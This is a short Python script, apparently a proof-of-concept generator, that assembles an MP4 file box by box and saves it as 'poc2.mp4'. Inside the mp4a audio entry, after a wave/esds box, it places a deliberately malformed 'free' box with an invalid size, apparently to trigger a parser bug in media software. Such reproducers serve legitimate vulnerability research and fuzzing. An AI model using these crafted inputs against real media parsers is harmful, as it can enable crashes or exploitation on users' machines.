import struct, pathlib

def box(t, payload=b''):
    return struct.pack('>I4s', 8+len(payload), t.encode()) + payload

def fullbox(t, version=0, flags=0, payload=b''):
    return box(t, bytes([version]) + flags.to_bytes(3,'big') + payload)

esds1 = fullbox('esds', 0, 0, b'\x03\x03\x00\x01\x00')
wave = box('wave', esds1)
bad = struct.pack('>I4s', 4, b'free')
sample_entry_header = b'\0'*6 + struct.pack('>H',1)
audio_fields = struct.pack('>HHIHHHHHH',0,0,0,2,16,0,0,44100,0)
mp4a = box('mp4a', sample_entry_header + audio_fields + wave + bad)
stsd = fullbox('stsd', 0, 0, struct.pack('>I',1) + mp4a)
stbl = box('stbl', stsd)
smhd = fullbox('smhd',0,0,b'\0\0\0\0')
url = fullbox('url ',0,1,b'')
dref = fullbox('dref',0,0, struct.pack('>I',1)+url)
dinf = box('dinf', dref)
minf = box('minf', smhd + dinf + stbl)
mdhd = fullbox('mdhd',0,0, struct.pack('>IIIIH',0,0,1000,0,0x55c4)+b'\0\0')
hdlr = fullbox('hdlr',0,0, b'\0\0\0\0' + b'soun' + b'\0'*12 + b'SoundHandler\0')
mdia = box('mdia', mdhd + hdlr + minf)
tkhd_payload = struct.pack('>IIIII',0,0,1,0,0) + b'\0'*8 + struct.pack('>HHHH',0,0,0x0100,0) + struct.pack('>9I',0x00010000,0,0,0,0x00010000,0,0,0,0x40000000) + struct.pack('>II',0,0)
assert len(tkhd_payload)==80, len(tkhd_payload)
tkhd = fullbox('tkhd',0,7, tkhd_payload)
trak = box('trak', tkhd + mdia)
mvhd_payload = struct.pack('>IIII',0,0,1000,0) + struct.pack('>I',0x00010000) + struct.pack('>H',0x0100) + b'\0'*10 + struct.pack('>9I',0x00010000,0,0,0,0x00010000,0,0,0,0x40000000) + b'\0'*24 + struct.pack('>I',2)
assert len(mvhd_payload)==96, len(mvhd_payload)
mvhd = fullbox('mvhd',0,0,mvhd_payload)
moov = box('moov', mvhd + trak)
ftyp = box('ftyp', b'isom\0\0\0\1isommp42')
poc = ftyp + moov
path=pathlib.Path('/workspace/poc2.mp4')
path.write_bytes(poc)
print(path, len(poc), 'mp4a', len(mp4a), 'stsd', len(stsd), 'moov', len(moov))
